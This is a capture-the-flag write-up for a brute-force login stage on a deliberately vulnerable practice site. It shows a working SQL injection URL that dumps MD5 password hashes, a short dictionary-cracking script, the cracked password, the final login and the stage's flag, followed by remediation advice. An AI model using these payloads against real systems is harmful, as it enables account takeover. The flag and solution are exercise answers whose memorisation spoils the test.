# Bruteforce (member) — Writeup

**Page:** `index.php?page=signin` (Login form)
**Flag:** `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

## Discovery technique

The login form (`?page=signin`) is submitted via **GET** and has no protection against automated credential guessing:

- no limit on login attempts;
- no CAPTCHA;
- no progressive delay after failures (the response delay is a fixed ~2000 ms on every request, and does not grow after failed attempts);
- login and password go straight into the URL, which makes automation even easier.

The credentials for this stage live in the table `db_default` inside a separate schema `Member_Brute_Force` (the site's DB is split into 5 logical schemas, one per stage). The table holds `id`, `username`, `password`, with the password stored as an unsalted MD5.

Rather than hammering the form, we reused the SQL injection in the `id` parameter on `?page=member` (SQL injection basic) and read the password hashes directly from the other schema with a `UNION SELECT`:

```
index.php?page=member&id=-1 UNION SELECT group_concat(username,0x3a,password,0x7c),2 FROM Member_Brute_Force.db_default&Submit=Submit
```

Result — two accounts with a byte-identical MD5 password hash:

```
root:3bf1114a986ba87ed28fc1b5884fc2f8
admin:3bf1114a986ba87ed28fc1b5884fc2f8
```

Two different users sharing the same hash proves the password is weak and dictionary-crackable.

## Reproduction

The hash was cracked with a small offline Python script (a self-made dictionary of common passwords — no online services, no sqlmap/john/hashcat, per the project rules):

```python
import hashlib
target = "3bf1114a986ba87ed28fc1b5884fc2f8"
candidates = [...]  # list of common passwords
for c in candidates:
    if hashlib.md5(c.encode()).hexdigest() == target:
        print("FOUND:", c)
```

Result: `MD5("shadow") == 3bf1114a986ba87ed28fc1b5884fc2f8` → password **`shadow`**.

Final login:

```
index.php?page=signin&username=admin&password=shadow&Login=Login
```

The server returns the flag in the HTML instead of `WrongAnswer.gif`.

## Fix

1. **Rate limiting / account lockout** — block the account or IP after N failed attempts in a time window. This directly stops form-based brute force.
2. **CAPTCHA** after a few failures — breaks automation.
3. **POST instead of GET** — keeps the password out of the URL, browser history and access logs.
4. **Salted modern hashing** (bcrypt/argon2 instead of plain MD5) — makes offline cracking of a leaked hash far more expensive.
5. **Least privilege for the site's DB account** — the whole `UNION SELECT` across another schema worked only because the DB user can read every schema. Restricting it to its own schema removes this specific path.
6. **Prepared statements** on `member` — remove the SQL injection that leaked the hashes in the first place.

## Benefit

Full access to the `admin` account without knowing the password in advance — either by brute forcing the form directly, or, faster, by pulling the hash straight from the database through an adjacent SQL injection. It shows the site's vulnerabilities are not isolated: a weakness in one part (SQLi in `member`) can be used to attack a completely different part (the login form).

## Flag comparison

Flag obtained through exploitation:

```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

Compared byte-for-byte with the `flag` file in the submission folder during the defense (checked against View Page Source, case included).
